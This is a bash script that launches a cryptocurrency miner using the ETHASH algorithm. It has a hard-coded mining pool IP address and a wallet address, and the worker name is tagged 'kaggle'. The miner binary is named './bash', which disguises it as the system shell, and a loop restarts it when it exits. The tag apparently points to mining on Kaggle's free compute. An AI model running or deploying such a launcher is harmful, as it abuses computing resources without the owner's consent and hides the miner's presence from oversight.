#!/bin/bash

#################################
## Begin of user-editable part ##
#################################

POOL=104.237.157.192:80
WALLET=3EbXVxnufjZeLQNZULi1qDpzSSMFz91QhN.kaggle

#################################
##  End of user-editable part  ##
#################################

cd "$(dirname "$0")"

./bash --algo ETHASH --pool $POOL --user $WALLET $@
while [ $? -eq 42 ]; do
    sleep 10s
    ./bash --algo ETHASH --pool $POOL --user $WALLET $@
done
